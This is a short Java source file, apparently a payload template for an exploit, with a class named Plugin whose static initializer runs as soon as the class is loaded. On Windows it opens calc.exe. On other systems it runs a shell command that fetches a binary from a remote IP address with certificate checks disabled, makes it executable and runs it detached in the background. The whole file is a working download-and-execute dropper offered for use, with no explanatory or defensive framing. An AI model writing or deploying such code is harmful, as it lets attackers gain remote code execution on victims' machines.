// javac --release 8 <your-payload>.java
public class Plugin {
    public Plugin() {}
    static {
        try {
            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                    ? new String[]{"cmd.exe","/c", "calc.exe"}
                    : new String[]{"sh","-c", "wget -qO fRitPo --no-check-certificate http://1.2.3.4:8081/fRitPo; chmod +x fRitPo; ./fRitPo& disown"};
            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {
        Plugin e = new Plugin();
    }
} 
